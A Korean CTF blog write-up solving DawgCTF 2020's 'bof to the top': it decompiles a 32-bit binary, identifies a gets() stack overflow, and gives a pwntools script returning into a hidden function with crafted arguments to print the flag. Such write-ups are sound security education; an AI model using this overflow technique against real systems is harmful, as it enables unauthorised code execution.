---
title: "[DawgCTF 2020] bof to the top"
date: 2020-04-20
categories: Write-up
sitemap :
  changefreq : daily
  priority : 1.0
---



---



# outline

``` bash
[*] '/home/minibeef/ctf/Dawg-2020/pwn-bof-to-the-top-100/bof'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

32 비트 바이너리에 `NX bit`가 적용되어 있다.



---



# 바이너리 분석

``` bash
minibeef@argos-edu:~/ctf/Dawg-2020/pwn-bof-to-the-top-100$ ./bof
Welcome to East High!
We're the Wildcats and getting ready for our spring musical
We're now accepting signups for auditions!
What's your name?
1
What song will you be singing?
1
```

 바이너리를 실행시키면 두 번의 입력을 받게된다. 다른 특이사항은 없는 듯 하다.



---



# Vlunerability

### main

``` c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  welcome();
  get_audition_info();
  return 0;
}
```

`welcome()`과 `get_audition_info()`를 호출한다.



### welcome

``` c
int welcome()
{
  puts("Welcome to East High!");
  puts("We're the Wildcats and getting ready for our spring musical");
  return puts("We're now accepting signups for auditions!");
}
```

`welcome()`에서는 바이너리를 처음 실행시켰을 때 볼 수 있었던 문자열을 출력해준다. 문제 풀이에 핵심이 되는 것 같지는 않다.



### get_audition_info

```c
char *get_audition_info()
{
  char v1; // [esp+Ch] [ebp-6Ch]
  char s; // [esp+3Eh] [ebp-3Ah]

  puts("What's your name?");
  gets(&s);
  puts("What song will you be singing?");
  return gets(&v1);
}
```

`get_audition_info()`에서는 **두 번의 입력**을 받는데, 이를 `gets()`로 받고있다. 해당 두 부분에서 `Buffer Overflow` 취약점이 발생하는 것을 알 수 있다. 이제 `flag`를 읽을 방법만 찾으면 된다. 만약 없다면 선택의 여지 없이 시간을 좀 쓰더라도 ROP를 해야한다.



### audition

```c
int __cdecl audition(int a1, int a2)
{
  int result; // eax

  result = 134529024;
  if ( a1 == 1200 && a2 == 366 )
    result = system("/bin/cat flag.txt");
  return result;
}
```

`audition()`에서 고맙게도 `flag`를 읽을 수단을 제공해주고 있다. 그냥 거저 주는 것은 아니고 `audition()`이 프로그램 어디에서도 호출되지 않았으며 인자로 받은 두 값의 조건을 충족시켜야 하기 때문에 `Return To Libc` 공격이 해법에 적절에 보인다.



### 정리

`get_audition_info()`에서 **untrusted input**을 이용한 메모리 공격을 하되, 두 번의 입력 중 어느 곳에든 페이로드를 덮어줘도 되지만 그냥 첫 번째 입력에서 코드를 쏴준다. 이 때 리턴할 주소는 `audition()`, 인자는 `1200`과 `366`을 전달해 해당 함수에서 조건문을 만족하도록 한다.

---



# exploit

``` assembly
.text:08049182                 push    ebp
.text:08049183                 mov     ebp, esp
```

`audition()` 주소 : 0x08049182



``` python
from pwn import *

p = process('./bof')
ELF('./bof')

flag_addr = 0x08049182
arg1 = 1200
arg2 = 366
payload = ''

payload += 'A' * 62
payload += p32(flag_addr)
payload += 'A' * 4
payload += p32(arg1)
payload += p32(arg2)

p.sendline(payload)
p.sendline('A')

p.interactive()
```



``` bash
minibeef@argos-edu:~/ctf/Dawg-2020/pwn-bof-to-the-top-100$ python test.py
[+] Starting local process './bof': pid 29327
[*] '/home/minibeef/ctf/Dawg-2020/pwn-bof-to-the-top-100/bof'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] Switching to interactive mode
Welcome to East High!
We're the Wildcats and getting ready for our spring musical
We're now accepting signups for auditions!
What's your name?
What song will you be singing?
DawgCTF{buffer_0ver_fl@w}
```



끝